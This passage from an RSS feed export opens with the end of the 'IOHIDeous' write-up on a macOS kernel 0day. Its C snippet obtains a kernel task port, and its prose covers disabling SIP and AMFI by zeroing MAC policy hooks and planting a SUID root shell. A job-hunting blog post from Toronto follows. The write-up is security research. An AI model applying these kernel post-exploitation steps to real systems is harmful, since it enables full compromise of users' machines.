&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;15.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;26&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_remap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remap_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VM_FLAGS_ANYWHERE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_FLAGS_RETURN_DATA_ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;zone_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;VM_INHERIT_NONE&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mach_vm_wire&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;realhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remap_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_PROT_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VM_PROT_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;realhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_make_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_alloc_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ipc_kobject_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;realhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remap_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;That makes it possible to obtain a working kernel task port from userland by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &amp;amp;kernel_task)&lt;/code&gt; as long as we’re root. Once we have that, we can put our ROP chain to rest and carry out the rest of our plans from userland, which I generally find a lot easier.&lt;br/&gt;One last thing should better happen in ROP though: repairs. Remember when we overflowed &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; with our &lt;code class=&quot;highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x90&lt;/code&gt; bytes? That might’ve corrupted things. On Sierra there doesn’t seem to be anything important there so &lt;code class=&quot;highlighter-rouge&quot;&gt;berzo&lt;/code&gt;‘ing out the memory suffices. On High Sierra though, &lt;code class=&quot;highlighter-rouge&quot;&gt;gFSLock&lt;/code&gt; sits there, and since that’s a pointer to an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOLock&lt;/code&gt;, we’re gonna get a panic if the kernel tries to dereference it. Luckily for us that only happens in combination with hibernation, which shouldn’t occur while we’re running anyway. But if we don’t repair it, the machine is gonna panic then next time it is put to sleep (believe me, this was &lt;em&gt;fun&lt;/em&gt; to debug). A simple call to &lt;code class=&quot;highlighter-rouge&quot;&gt;IOLockAlloc&lt;/code&gt; saves us all that trouble though. In the future there might also be arbitrary other things after &lt;code class=&quot;highlighter-rouge&quot;&gt;_hibernateStats&lt;/code&gt; - you just gotta adapt to whatever you find.&lt;/p&gt;
&lt;p&gt;With that, let’s leave ROP be and go back to userland. We should have root now, so the first thing we do is that &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; to update our host port, and then we use that to get the kernel task port. Now we wanna disable SIP and AMFI, and install a root shell. Being root, we could already put a SUID binary somewhere - but obviously we wanna put it in a cool place, like &lt;code class=&quot;highlighter-rouge&quot;&gt;/System/pwned&lt;/code&gt;. The only thing stopping us from doing all that are MAC policies. A number of file ops prevent us from making changes in &lt;code class=&quot;highlighter-rouge&quot;&gt;/System&lt;/code&gt;, and the NVRAM ops prevent us from adding &lt;code class=&quot;highlighter-rouge&quot;&gt;amfi_get_out_of_my_way=1&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;boot-args&lt;/code&gt; which would disable AMFI, and from setting &lt;code class=&quot;highlighter-rouge&quot;&gt;csr-active-config&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3ff&lt;/code&gt; which would disable SIP, and which is required in order for &lt;code class=&quot;highlighter-rouge&quot;&gt;amfi_get_out_of_my_way&lt;/code&gt; to be honoured. So let’s just zero out all file-system- and nvram-related ops from all policies, and we’re good to go.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/rop.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/rop.c&lt;/code&gt;&lt;/a&gt; (ROP chain), &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/main.c&lt;/code&gt;&lt;/a&gt; (kernel patches and persistence) and &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/helper/helper.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/helper/helper.c&lt;/code&gt;&lt;/a&gt; (root shell).&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Having achieved all that, there is nothing left for us to do but print some awesome ASCII art, and exit.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/9-iohideous.png&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/9-iohideous.png&quot; alt=&quot;IOHIDeous ASCII art&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Woah.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One tiny, ugly bug. Fifteen years. Full system compromise.&lt;/p&gt;
&lt;p&gt;A lot has changed since my last write-up, but this was again an awesome experience and a whole lot of work, and I have again learned an insane amount of new things. The move to x86 was new to me, and this time I’ve been dealing with a 0day rather than some public bug, but I think I can say I’ve managed it quite nicely. :P&lt;/p&gt;
&lt;p&gt;A “thank you” goes out to all the people I’ve quoted for their work, as well as to the &lt;a href=&quot;https://github.com/radare/radare2&quot;&gt;radare2 project&lt;/a&gt; for their overly awesome reverse engineering toolkit.&lt;/p&gt;
&lt;p&gt;The entire project is available &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/&quot;&gt;on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Again, don’t hesitate to shoot me questions or feedback &lt;a href=&quot;https://twitter.com/s1guza&quot;&gt;on Twitter&lt;/a&gt; or via mail (&lt;code class=&quot;highlighter-rouge&quot;&gt;*@*.net&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;siguza&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Cheers. :)&lt;/p&gt;
&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
</description>
<pubDate>Sun, 31 Dec 2017 23:17:58 +0000</pubDate>
<dc:creator>tptacek</dc:creator>
<og:title>IOHIDeous</og:title>
<og:description>IOHIDFamily 0day</og:description>
<og:url>https://siguza.github.io/IOHIDeous/</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://siguza.github.io/IOHIDeous/</dc:identifier>
</item>
<item>
<title>How I Learned to Stop Worrying and Love the Job Hunt</title>
<link>https://blog.stephanbehnke.com/how-i-learned-to-stop-worrying-and-love-the-job-hunt-in-toronto/</link>
<guid isPermaLink="true" >https://blog.stephanbehnke.com/how-i-learned-to-stop-worrying-and-love-the-job-hunt-in-toronto/</guid>
<description>&lt;p&gt;This is a story about finding a job as a senior software engineer in Toronto - with a twist: just having moved there from Germany.&lt;/p&gt;&lt;p&gt;I was prepared. I had a plan. But it failed completely - at first. I had to adapt and learn. It was a roller coaster ride.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.stephanbehnke.com/content/images/2017/05/pexels-photo-52608-1.jpeg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I tell my story because it might help others learn from my mistakes. This is &lt;em&gt;not&lt;/em&gt; meant as a bigger statement about immigration or the state of the tech scene. It's simply about my experience.&lt;/p&gt;
&lt;p&gt;Please note: I will &lt;em&gt;not&lt;/em&gt; mention the names of companies. This way, I can speak more openly without hurting anyone's reputation - most of all mine. Again, it is not intended to denounce anyone, but to give an insight into how I found my job.&lt;/p&gt;
&lt;h2 id=&quot;preparation&quot;&gt;Preparation&lt;/h2&gt;
&lt;p&gt;I'm a software engineer, working in software for almost 10 years, having prior startup experience and coming from a Java/Scala background with React, Go and Node experience from side projects.&lt;/p&gt;
&lt;p&gt;Although I had quite a good idea of what I wanted, I was open to jobs that didn't fit my criteria perfectly. Since I immensely enjoyed working on a product at my last employer, I wanted to do that again. The tech stack was not &lt;em&gt;that&lt;/em&gt; important, but there were certain things I didn't want to touch again (like PHP and Angular.js 1.x). Furthermore, I was looking for companies with 20 to 100 engineers. Coming from a smaller startup, I wanted to experience what a significantly larger one feels like. The type of industry wasn't that important to me, however, shady business models like online gambling were on my blacklist.&lt;/p&gt;
&lt;h3 id=&quot;research&quot;&gt;Research&lt;/h3&gt;
&lt;p&gt;At first, I wanted to get a broad overview of the opportunities in Toronto. By searching through job boards, lists of great workplaces or &quot;startups to watch&quot;, I compiled an extensive list of startups.&lt;/p&gt;
&lt;p&gt;I used Trello to keep track of all of them. I always made a note about a company's tech stack and their industry. Additionally, I put them on a &lt;a href=&quot;https://www.google.com/maps/d/&quot;&gt;Google My Maps&lt;/a&gt; to see where startups are usually located. Since I didn't have an apartment yet either, it was useful to know where I should live if I wanted to be close to work.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.stephanbehnke.com/content/images/2017/05/C7SNabpU4AQ6L3V.jpg_large-1.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I categorized each company into &quot;Hell, no!&quot; (red), &quot;Well... maybe&quot; (yellow) and &quot;Wow&quot; (green) based on their tech, industry and what I could find on Glassdoor.&lt;/p&gt;
&lt;h3 id=&quot;sideproject&quot;&gt;Side Project&lt;/h3&gt;
&lt;p&gt;As a result of my research, I noticed that the companies I found the most interesting were not using Java but Python, Ruby or Node. Out of dozens of startups, I actually found just one that was Java-based. Fortunately, there was still enough time to tip the odds in my favor.&lt;/p&gt;
&lt;p&gt;I had played around with Python for a data science project at my last company. I liked it. The momentum seemed to be on Python's side, compared to Ruby which seems to be on the decline. Since I already had quite some experience in Node from toy projects, I bet on Python.&lt;/p&gt;
&lt;p&gt;As a consequence, I read two Python books, one to learn the basics and one about more advanced patterns. Furthermore, I practiced with a variety of coding challenge websites - which helped me to apply my new skills, learn various aspects of the language and, by looking at other user's solutions, about idiomatic Python usage.&lt;/p&gt;
&lt;p&gt;Around the same time, I also had an idea for a side project. Since it was my impression that having a side project was almost required these days, I got to work and started implementing my idea in Python - two birds with one stone.&lt;/p&gt;
&lt;p&gt;The final result is &lt;a href=&quot;https://subvoc.stephanbehnke.com/&quot;&gt;subvoc&lt;/a&gt;. It allows people to search for difficult words in movies. The idea being that if English is not your native language but you are quite advanced, you can see which words in the movie you just watched in English are the most difficult and you can learn their meaning.&lt;/p&gt;
&lt;h2 id=&quot;applying&quot;&gt;Applying&lt;/h2&gt;
&lt;p&gt;As part of my research I learned that most jobs are not found online, they can only be accessed through your network. Knowing the right person is the way to go in North America. And while I read this over and over, I thought it wouldn't apply to me. I'm a software engineer after all, I thought, there is a huge demand for me. Virtually every company I was interested in had a job opening that roughly fit my experience. I'm going to be fine, I thought.&lt;/p&gt;
&lt;p&gt;Well...&lt;/p&gt;
&lt;p&gt;Within a few days, I had applied to five companies online. I took a bit of time to craft a cover letter for each of them. They weren't perfect, but quite good. Then I was waiting for all the inquiries to fill up my inbox.&lt;/p&gt;
&lt;p&gt;Nothing. Happened.&lt;/p&gt;
&lt;p&gt;Even one company where I seemed to be an almost 100% fit didn't get back to me.&lt;/p&gt;
&lt;p&gt;I panicked.&lt;/p&gt;
&lt;p&gt;I was questioning everything. Is my resume not good enough? Is my cover letter bad? Is my skill set not required? Am I lacking experience? Is it because I'm not Canadian? Doubt and uncertainty were getting to me.&lt;/p&gt;
&lt;p&gt;I knew that going forward, this approach wouldn't work. Fortunately, I had tested this out first and didn't target my most sought-after companies right away. But what could I do differently now?&lt;/p&gt;
&lt;h2 id=&quot;planbthen&quot;&gt;Plan B, then&lt;/h2&gt;
&lt;h3 id=&quot;meetups&quot;&gt;Meetups&lt;/h3&gt;
&lt;p&gt;Good thing I started going to every tech &lt;a href=&quot;http://meetup.com/&quot;&gt;meetup&lt;/a&gt; in the city I could find the time for. Basically, every night of the first three weeks I met people from the tech scene. This was a crucial step to getting into the scene quickly. At those meetups I could visit company offices, talk to fellow engineers, learn about the state of IT in Toronto and simply expand my network.&lt;/p&gt;
&lt;p&gt;But what can work even better is to actually present something at a meetup. I managed to secure a spot in the local Hack&amp;amp;Tell. I presented my side project (and unexpectedly won a Raspberry Pi). When I attended the Python meetup, I took the opportunity to talk about interesting technologies and concepts on stage that I had discovered with my side project. This put me in the spotlight. And people started mentioning to me that they were hiring ...&lt;/p&gt;

&lt;p&gt;Then I learned that there are two big online tech Slack communities: TorontoJS and Techmasters. Naturally, I joined them and started reading and contributing a little bit. I then took the initiative and asked around for job opportunities in the #jobs channel. I described what I was looking for and told them to contact me via Slack. A few developers did. One conversation actually led to an interview. Another one informed me about companies to avoid and eventually put me in contact with a recruiter he trusted.&lt;/p&gt;
&lt;h3 id=&quot;recruiter&quot;&gt;Recruiter&lt;/h3&gt;
&lt;p&gt;I didn't have any experience with recruiters before. Usually, they write me on LinkedIn and I ignore them. Now I was desperate. I talked to the recruiter that was recommended to me for an hour. He was very insightful. Asked me questions that helped me realize what's important. Shared a few tips on how to improve my resume. He also gave me a rough idea about what salary I could expect. All in all, the conversation was extremely helpful.&lt;/p&gt;
&lt;h3 id=&quot;network&quot;&gt;Network&lt;/h3&gt;
&lt;p&gt;Another thing that worked in my favor was that someone from my last workplace knew a few people in Toronto from an annual HR conference. She put me in contact with a person who introduced me to someone at an innovation hub that worked with a lot of startups. We had a short meeting and I came out with a couple of intros to the companies I was interested in. Jackpot! The network at work.&lt;/p&gt;
&lt;h3 id=&quot;moreonlineapplications&quot;&gt;More online applications&lt;/h3&gt;
&lt;p&gt;But there were a few companies left that I simply couldn't get closer to. I decided to submit an online application again. I completely re-did my resume, applying the tips I got so far, put a lot of effort into polishing my LinkedIn profile, asked for a couple more recommendations from former colleagues and invested more time into the cover letters.&lt;/p&gt;
&lt;p&gt;A few things that I changed in my resume:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;make the skill section even easier to spot and scan by putting it in a right-hand column instead of the bottom third&lt;/li&gt;
&lt;li&gt;add a short summary section where you mention how many years of experience you have in the very first line&lt;/li&gt;
&lt;li&gt;make sure each bullet point fits on a single line&lt;/li&gt;
&lt;li&gt;use colors to highlight different sections&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The result? I got two responses out of two applications I sent out.&lt;/p&gt;
&lt;h3 id=&quot;jobmarketplace&quot;&gt;Job Marketplace&lt;/h3&gt;
&lt;p&gt;I had also heard of those platforms where you put up your profile and companies start contacting you. I tried &lt;a href=&quot;https://hired.ca/&quot;&gt;Hired&lt;/a&gt;. It took about two hours to set everything up. When my profile went online, it was exhilarating. Inquiries were pouring in. Within a day, I had 10 companies interested in me. Unfortunately, most of them didn't fit my criteria: they were large enterprise companies, not located in Toronto or early-stage startups. In the end, I talked to two of the companies. All in all, it was a rewarding experience.&lt;/p&gt;
&lt;h2 id=&quot;prescreening&quot;&gt;Pre-Screening&lt;/h2&gt;
&lt;p&gt;The first hurdle of the interview process is almost always a phone call with someone from HR. There are tons of tips online about this step but here is what I observed.&lt;/p&gt;
&lt;p&gt;First of all, do your research! Know what the company does, what industry they are in. Bonus points: Read 1-2 blog posts and casually mention things you picked up. Set up an account with them and explore the product, if possible. I also tried to find the most important qualities the company expects from its job ads (e.g. speed) and then used these to describe myself.&lt;/p&gt;
&lt;p&gt;Secondly, everyone usually asks the same questions. The top 5 for me have been:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Why do you want to work for us?&lt;/li&gt;
&lt;li&gt;Could you tell me something about yourself?&lt;/li&gt;
&lt;li&gt;What was your biggest accomplishment?&lt;/li&gt;
&lt;li&gt;Are you applying elsewhere? / Do you already have an offer?&lt;/li&gt;
&lt;li&gt;What are your salary expectations?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Don't forget, this is an HR professional. They are trying to see if you can form complete sentences, know who you are talking to and are - just very roughly - a fit with what they are looking for. Help them understand, use a few keywords from the job ad, put things in perspective and explain the positive impact you had in layman's terms.&lt;/p&gt;
&lt;h2 id=&quot;codingchallenge&quot;&gt;Coding Challenge&lt;/h2&gt;
&lt;p&gt;Coding challenges are a very distinct IT phenomenon. In what other profession do you find such an elaborate and commonplace procedure to put applicants to the test? Maybe this should give us all something to ponder. Why is it that someone who worked at various tech companies, has an active GitHub profile and a blog, is asked to go through programming puzzles? I digress.&lt;/p&gt;
&lt;p&gt;Here are the coding challenges I had to do:&lt;/p&gt;
&lt;h3 id=&quot;hackerrank&quot;&gt;HackerRank&lt;/h3&gt;
&lt;p&gt;HackerRank is a platform dedicated to coding challenges. You can practice them in a multitude of programming languages. Their business model is to sell this platform to companies as a way to test applicants.&lt;/p&gt;
&lt;p&gt;My challenge involved nine exercises, for example:&lt;/p&gt;
&lt;p&gt;The trick is that you only have 90 minutes. But at least you are allowed to use an IDE and your language's documentation. Furthermore, there are tests you can run your solution against and get prompt feedback.&lt;/p&gt;
&lt;p&gt;To be honest, I hated that test. I had actually practiced on HackerRank now and then and recognized two of the exercises. But still, in the end I only finished about 80% before the time was up. I knew that the test was designed to make me fail but this didn't help me feel better.&lt;/p&gt;
&lt;h3 id=&quot;remoteinterviewio&quot;&gt;Remoteinterview.io&lt;/h3&gt;
&lt;p&gt;This test was very similar to the one before but on a different platform and much more relaxed. There was no countdown. This made a huge difference in how I could approach the exercises.&lt;/p&gt;
&lt;p&gt;The challenges were:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Duplicate an array&lt;/li&gt;
&lt;li&gt;Fix the code to only print out even numbers&lt;/li&gt;
&lt;li&gt;Fix the code to calculate the square of two numbers&lt;/li&gt;
&lt;li&gt;Refactor some code to make it more functional&lt;/li&gt;
&lt;li&gt;Explain what &lt;code&gt;[&quot;123&quot;, &quot;456&quot;, &quot;789a&quot;, ...].map(parseInt)&lt;/code&gt; returns&lt;/li&gt;
&lt;li&gt;What ECMAScript proposal are you most excited about?&lt;/li&gt;
&lt;li&gt;Given a set of requirements, what tech stack would you choose?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;I enjoyed this challenge much more than the previous one. The questions didn't test whether I could find an algorithm to completely artificial problems but rather explored various aspects of programming: understanding and fixing existing code, refactoring, and higher-level thinking and opinions.&lt;/p&gt;
&lt;p&gt;The exception being the one that tested my knowledge of JavaScript quirks. &lt;code&gt;parseInt&lt;/code&gt; has some very weird behavior. But fortunately, you can just go and read the documentation since there is no countdown.&lt;/p&gt;
&lt;h3 id=&quot;miniproject&quot;&gt;Mini-project&lt;/h3&gt;
&lt;p&gt;Another company asked me to create a web application based on a short specification. I liked that I was able to pick any language and framework I wanted to. Furthermore, the project was related to the company's business and was described very well.&lt;/p&gt;
&lt;p&gt;While they said I shouldn't spend more than a &quot;couple of hours&quot; on it, it took me pretty much one and a half days to finish. This was mostly due to the fact that I picked a tech stack I'm not as well-versed in as I am in Java (but building frontends in Java is a pain). Another reason was that I hadn't used PostgreSQL in a while (was required to be used).&lt;/p&gt;
&lt;p&gt;Anyway, when I finished and packaged it up, I was very close to submitting it. But then I realized I hadn't tried to run the bundle I created. I tried it and the app didn't start. I forgot to add one of the directories. I fixed it, tried again and it worked. Good thing I hadn't sent the broken one!&lt;/p&gt;
&lt;p&gt;All in all, I thought this was a fun and worthwhile challenge, albeit a bit too time-consuming.&lt;/p&gt;
&lt;h3 id=&quot;trickyalgorithm&quot;&gt;Tricky Algorithm&lt;/h3&gt;
&lt;p&gt;From another company, I received a comparatively tiny but still very difficult challenge. From a list of events, I was supposed to find and return a list of all event pairs that overlap. On top of that, I was asked to write it in the programming language they chose. I only had a bit of experience with that language. Since it's a functional programming language, I made sure to write the algorithm as idiomatic as possible.&lt;/p&gt;
&lt;p&gt;Coming up with the algorithm took me about an hour - but implementing it as concise, functional and efficient as I could took me roughly three hours. I used tests to cover all the edge cases and to make sure that I was submitting a working solution.&lt;/p&gt;
&lt;p&gt;This was a very cool challenge. I got to solve a tricky problem and play around with a new programming language.&lt;/p&gt;
&lt;h3 id=&quot;interactivecoding&quot;&gt;Interactive Coding&lt;/h3&gt;
&lt;p&gt;Last but not least, I was asked to prepare a tiny ToDo application (which took me about an hour). Then, during a call with an engineer, I was required to add a few additional features.&lt;/p&gt;
&lt;p&gt;In the end, I was asked about the space and time complexity of the last, most challenging algorithm. All in all, quite straightforward. I found it very important to have a dialogue with the interviewer. Especially, asking him to clarify constraints and requirements made a huge difference. Just starting to code is usually a bad move.&lt;/p&gt;
&lt;h3 id=&quot;ignoringthechallenge&quot;&gt;Ignoring the Challenge&lt;/h3&gt;
&lt;p&gt;I got a challenge from a company and due to my prioritization and commitments, I wasn't able to work on it before the deadline. I wrote them and explained the situation, telling them that I cannot interview with them any longer since I'm too busy with other companies.&lt;/p&gt;
&lt;p&gt;To my surprise, they offered to fly me in to their New York headquarters straight away to meet the team. I was baffled. Ultimately, I didn't think the company was a good fit, though and I had to move on.&lt;/p&gt;
&lt;h2 id=&quot;interview&quot;&gt;Interview&lt;/h2&gt;
&lt;h3 id=&quot;1&quot;&gt;#1&lt;/h3&gt;
&lt;p&gt;Before my first interview, I wasn't really nervous. I saw it as a trial run.&lt;/p&gt;
&lt;p&gt;At first, I was asked by the CTO to speak about my previous work experience and I got to explain my biggest accomplishment in-depth at the whiteboard. They were quite impressed.&lt;/p&gt;
&lt;p&gt;Then, there was a coding challenge. I was asked to prepare my development environment beforehand. The exercise was to implement the Game of Life, pairing with the VP of Engineering. This was interesting because it wasn't purely about my coding skills but also about my communication skills.&lt;/p&gt;
&lt;p&gt;At first, things went quite badly. I wasn't as confident in Python as I thought I would be. I made a bunch of amateur mistakes in the first five minutes. But thanks to my test-driven approach, I was gradually gaining confidence. In the end, I finished on time with a working solution. Success! The CTO and VP of Engineering both commented on the solution being very succinct.&lt;/p&gt;
&lt;p&gt;Apparently, everyone was fairly impressed because suddenly the CEO was coming in and interviewing me. We spoke for over an hour. I asked about the main challenges and the future direction of the company. He asked what my expectations for the role and salary were. After a long afternoon, I left the interview room in a very good mood and expected an offer very soon.&lt;/p&gt;
&lt;p&gt;After two days, I got an email. They declined. I was quite surprised, wondering what I had done wrong. The person that got me the interview later found out that they were indeed impressed but didn't think they had a suitable role for me at the company at the moment.&lt;/p&gt;
&lt;h3 id=&quot;2&quot;&gt;#2&lt;/h3&gt;
&lt;p&gt;My second interview was with a company that seemed like a natural fit for me technology-wise: They use Java for everything. On the one hand, I was confident because of my vast Java experience - but on the other hand, I didn't yet know the reason why my first interview didn't get me an offer and feared I was doing something fundamentally wrong.&lt;/p&gt;
&lt;p&gt;I met with three people who would each throw various tests at me.&lt;/p&gt;
&lt;p&gt;The first one was basically a Java quiz: What can be marked as &lt;code&gt;final&lt;/code&gt;? What types of visibility exist? What is the default behavior of &lt;code&gt;==&lt;/code&gt;? What is the relation between &lt;code&gt;hashCode&lt;/code&gt; and &lt;code&gt;equals&lt;/code&gt;? I knew most of it but it was getting harder with every question. When I was asked how the Java &lt;code&gt;HashMap&lt;/code&gt; implementation works, I drew a blank. I've used it hundreds of thousands of times throughout my career but the last time I thought about how hash maps work internally was at university. Needless to say, it didn't go so well. One part of me was angry at myself for not knowing that, and the other part was angry at the interviewer for asking such a low-level question.&lt;/p&gt;
&lt;p&gt;The second interviewer drew their app's dashboard on the whiteboard and asked me to design a REST API for it. I developed a solution fairly quickly and discussed the trade-offs of being RESTful and optimizing for performance. I even touched on GraphQL.&lt;/p&gt;
&lt;p&gt;The third interview was about design. I was tasked with designing the objects of a multi-player chess game. I found it very contrived. The interviewer also didn't seem very confident. It was an odd experience.&lt;/p&gt;
&lt;p&gt;I got a call the next morning. They made me an offer. I told them, I'm still talking to other companies and they were okay with that but wanted an answer soon.&lt;/p&gt;
&lt;h3 id=&quot;3&quot;&gt;#3&lt;/h3&gt;
&lt;p&gt;The process for my next interview was very organized.&lt;/p&gt;
&lt;p&gt;When I arrived, I was given a quick tour of the office. Unfortunately, my impression was very negative. They had a common area (loud!) right beside the desks (supposed to be quiet!). The office was almost completely devoid of natural light - it felt like a bunker. Afterwards, I was placed in a meeting room where I had four interviews, each one hour long.&lt;/p&gt;
&lt;p&gt;The first one built upon a homework I was given. My task was to adapt my solution to new requirements. This was fun, sort of. There were two interviewers and we all huddled around my 13&quot; laptop. As I worked through the exercise, I felt a bit overwhelmed by the various edge cases and the expectant interviewers. I wasn't able to get it done in time. The biggest issue was that even after the interviewers left, my brain was still busy solving the last task. It took me quite a while to let go and re-focus.&lt;/p&gt;
&lt;p&gt;The next interview was about data modeling and system design. At first, I was tasked with modeling a 'receipt'. But my head was still busy with the last exercise. To make matters worse, I was also confused about the whole concept: In Germany, you usually deal with invoices, not receipts. The interviewers didn't seem capable of guiding me through this problem. Anyway, I stumbled through the exercise and was pretty disappointed how things went so far.&lt;/p&gt;
&lt;p&gt;But then it turned around. We had a bit of time left and I was given a system design question: designing an OCR for receipts. Now, before I went into the interview, I read something on Glassdoor and found a hint on this question. The day before the interview I worked through the problem twice. It blew them away. I was able to come up with a very good solution extremely quickly. I could tell they were impressed. I'll let you decide whether this was unethical.&lt;/p&gt;
&lt;p&gt;Then, I talked to two development managers about the way they worked and two 'regular' people about their culture in my last interview. Nothing too spectacular.&lt;/p&gt;
